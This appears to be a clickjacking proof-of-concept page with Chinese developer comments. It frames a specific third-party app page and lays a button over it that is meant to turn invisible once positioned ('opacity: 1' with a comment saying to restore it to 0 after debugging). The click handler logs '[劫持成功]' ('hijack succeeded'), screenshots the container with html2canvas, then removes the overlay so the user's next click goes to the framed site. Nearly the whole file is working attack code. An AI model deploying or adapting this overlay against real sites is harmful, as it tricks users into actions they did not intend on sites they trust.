<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tiger Fofo</title>
    <link rel="icon" href="https://img.lptcha.top/topic/pwa_img/90b52ad967f872601b9c1e4a8ae8a974.png">
    <link rel="manifest" href="index/manifest.json/">
    <link rel="apple-touch-icon" href="https://img.lptcha.top/topic/pwa_img/90b52ad967f872601b9c1e4a8ae8a974.png">
    <style>
        /* CSS 样式保持不变，请确保您已经按照第一步调试好了按钮的位置 */
        html, body {
            font-family: 'Microsoft YaHei', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0; padding: 0;
            background-color: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100%;
            overflow: hidden;
        }
        .main-content {
            width: 390px;
            height: 844px;
            position: relative;
            background-color: #ffffff;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
            border-radius: 10px;
        }
        .target-iframe {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            border: none;
            z-index: 1;
            border-radius: 10px;
        }
        .clickjacking-overlay {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 10;
            pointer-events: none;
            display: flex;
            justify-content: center;
        }
        .overlay-dialog {
            position: relative;
            width: 100%;
        }
        /* 确保这里的 CSS 是您调试好的最终版本，然后恢复透明度 */
        .fixed-attack-button {
            position: absolute;
            pointer-events: auto;
            cursor: pointer;
            opacity: 1; /* 调试完成后，恢复为 0 */
            background-color: transparent;
            border: none;

            /* --- 这些值必须是你重新测量后的结果 --- */
            width: 92%;
            height: 48px;
            top: 450px;
            left: 50%;
            transform: translateX(-50%);
        }
    </style>
    <!-- 引入 html2canvas 库 -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
</head>
<body>
<div id="capture-container" class="main-content">
    <object id="targetIframe" class="target-iframe" data="https://umk.lptcha.top/app.html" title="目标网站内容"></object>
    <div id="clickjackingOverlay" class="clickjacking-overlay">
        <div class="overlay-dialog">
            <button id="fakeSubmitButton" class="fixed-attack-button"></button>
        </div>
    </div>
</div>

<script>
    const fakeButton = document.getElementById('fakeSubmitButton');
    const overlay = document.getElementById('clickjackingOverlay');
    const captureContainer = document.getElementById('capture-container');
    if (fakeButton && overlay ) {

        fakeButton.addEventListener('click', function(event) {

            console.log('[劫持成功] 捕获到第一次点击事件。');

            // 1. **立即执行截图**
            // 我们的目标是包含 iframe 的容器，而不是整个 body
            console.log('[操作] 准备截图...');
            debugger
            html2canvas(captureContainer, {
                useCORS: true, // 允许加载跨域图片（如果父页面有的话）
                allowTaint: true,
                // **重要：告知 html2canvas 忽略 iframe**
                ignoreElements: (element) => element.tagName === 'IFRAME'
            }).then(canvas => {
                console.log('截图完成！但请注意，iframe 内容不会被捕获。');

                // 将截图转换为图片并下载
                const image = canvas.toDataURL("image/png");
                const link = document.createElement('a');
                link.href = image;
                link.download = 'hijack-screenshot.png';
                link.click(); // 触发下载
            });

            // 2. **执行后续的劫持操作**
            // 移除覆盖层
            console.log('[操作] 正在移除覆盖层...');
            overlay.remove();

            const clickX = event.clientX;
            const clickY = event.clientY;

            setTimeout(() => {
                const elementUnderMouse = document.elementFromPoint(clickX, clickY);
                if (elementUnderMouse && elementUnderMouse.tagName === 'IFRAME') {
                    console.log('[结果] 第二次点击的目标是 iframe 本身。');
                } else {
                    console.log('[结果] 第二次点击的目标是:', elementUnderMouse);
                }
            }, 0);

        }, { once: true });
    }
</script>

</body>
</html>
